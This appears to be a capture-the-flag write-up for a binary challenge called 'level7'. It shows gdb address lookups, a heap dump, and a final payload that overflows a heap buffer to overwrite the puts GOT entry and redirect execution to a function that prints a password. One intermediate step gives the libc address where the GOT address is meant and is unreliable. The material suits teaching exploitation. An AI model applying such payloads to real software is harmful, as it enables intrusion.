Looking at file source, the password is stored in a global variable at the end of main

we will try to overwrite call to function `puts` to call to function `m` to read the global cvariable c

### Lets find the addresse of `puts` and address of `m`

```console
(gdb) x &puts
0xb7e927e0 <puts>:	0x893cec83
```

```console
(gdb) x &m
0x80484f4 <m>:	0x83e58955
```

We try to overwrite the GOT table 

Address of puts@GOT 08049928 -->\x28\x99\x04\x08

Address of m = `0x080484f4` == `\xf4\x84\x04\x08`

### How to overwrite address of got ?

Through a heap buffer overflow !

```console
(gdb) x/50x 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000
```

With `argv[1]` we will write in `str1`. we will overflow to write the address of m on the address of put in the got table

so first we have to overwrite the address of the 2nd structure on the heap with the address of got

`"A" * 20 + "\xe0\x27\xe9\xb7"`

when we arrive at the second strcpy we can write the value of m inside the overwrited pointer of put in GOT

`\x28\x99\x04\x08`

### Payload

```
./level7 `(python -c 'print ("A" * 20 + "\x28\x99\x04\x08")')` `(python -c 'print ("\xf4\x84\x04\x08" * 16)')`
```

